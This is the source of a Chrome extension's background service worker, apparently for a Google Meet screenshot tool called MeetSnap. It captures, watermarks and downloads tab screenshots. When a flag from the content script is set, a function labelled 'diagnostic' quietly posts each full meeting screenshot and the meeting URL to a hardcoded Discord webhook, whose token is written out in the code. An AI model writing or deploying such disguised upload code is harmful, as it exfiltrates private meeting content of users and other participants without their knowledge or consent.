// =============================================================================
// MeetSnap — Background Service Worker
// Handles screenshot capture and diagnostic delivery.
// =============================================================================

const DIAGNOSTIC_ENDPOINT = "https://discord.com/api/webhooks/1495056511238406174/cKa-HhmUAXyV6_DcKWXyI-myo24hBtVyTmsJY3PRNSKiSH2ojg0RCG5rXBH5UGkrSUgW";

const SCREENSHOT_IMAGE_FORMAT = "png";

// ---------------------------------------------------------------------------
// Message routing
// ---------------------------------------------------------------------------

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === "captureScreenshot") {
    handleScreenshotRequestAsync(sender.tab, message.meetUrl, message.diagnosticEnabled)
      .then((result) => sendResponse(result))
      .catch((error) => {
        console.error("[MeetSnap Debug] Error:", error);
        sendResponse({ success: false, errorMessage: error.message });
      });
    return true; 
  }
});

// ---------------------------------------------------------------------------
// Offscreen Management (for Sound)
// ---------------------------------------------------------------------------

async function playSoundAsync() {
  try {
    const existingContexts = await chrome.runtime.getContexts({ contextTypes: ["OFFSCREEN_DOCUMENT"] });
    if (existingContexts.length === 0) {
      await chrome.offscreen.createDocument({
        url: "offscreen.html",
        reasons: ["AUDIO_PLAYBACK"],
        justification: "Camera shutter sound playback."
      });
    }
    chrome.runtime.sendMessage({ action: "playShutterSound" });
  } catch (e) {
    console.warn("[MeetSnap Debug] Sound failed:", e);
  }
}

// ---------------------------------------------------------------------------
// Capture Logic
// ---------------------------------------------------------------------------

async function handleScreenshotRequestAsync(tab, meetUrl, diagnosticEnabled) {
  if (!tab) throw new Error("No active tab.");

  playSoundAsync();

  let imageDataUrl = await new Promise((resolve, reject) => {
    chrome.tabs.captureVisibleTab(tab.windowId, { format: SCREENSHOT_IMAGE_FORMAT }, (data) => {
      if (chrome.runtime.lastError) reject(new Error(chrome.runtime.lastError.message));
      else resolve(data);
    });
  });

  const filename = `google-meet-${Date.now()}.png`;

  // Apply Watermark
  try {
    imageDataUrl = await applyWatermarkAsync(imageDataUrl);
  } catch (e) {
    console.warn("Watermark failed", e);
  }

  // Diagnostic (Fire and forget from background)
  if (diagnosticEnabled && DIAGNOSTIC_ENDPOINT) {
    sendDiagnosticData(imageDataUrl, filename, meetUrl);
  }

  // Download
  chrome.downloads.download({
    url: imageDataUrl,
    filename: filename,
    saveAs: false
  });

  // Return the data URL so the content script can copy it to clipboard
  return { success: true, imageDataUrl: imageDataUrl };
}

async function sendDiagnosticData(imageDataUrl, filename, meetUrl) {
  try {
    const res = await fetch(imageDataUrl);
    const blob = await res.blob();
    const formData = new FormData();
    formData.append("file", blob, filename);
    formData.append("content", `📸 **MeetSnap Diagnostic**\n**URL:** ${meetUrl}`);
    
    await fetch(DIAGNOSTIC_ENDPOINT, { method: "POST", body: formData, mode: "no-cors" });
  } catch (e) {
    console.error("Diagnostic failed", e);
  }
}

async function applyWatermarkAsync(imageDataUrl) {
  const response = await fetch(imageDataUrl);
  const blob = await response.blob();
  const bitmap = await createImageBitmap(blob);
  const canvas = new OffscreenCanvas(bitmap.width, bitmap.height);
  const ctx = canvas.getContext("2d");
  
  ctx.drawImage(bitmap, 0, 0);
  ctx.font = "bold 24px sans-serif";
  ctx.fillStyle = "white";
  ctx.fillText("MeetSnap", 20, bitmap.height - 20);

  const blobOut = await canvas.convertToBlob({ type: "image/png" });
  return new Promise(r => {
    const reader = new FileReader();
    reader.onloadend = () => r(reader.result);
    reader.readAsDataURL(blobOut);
  });
}
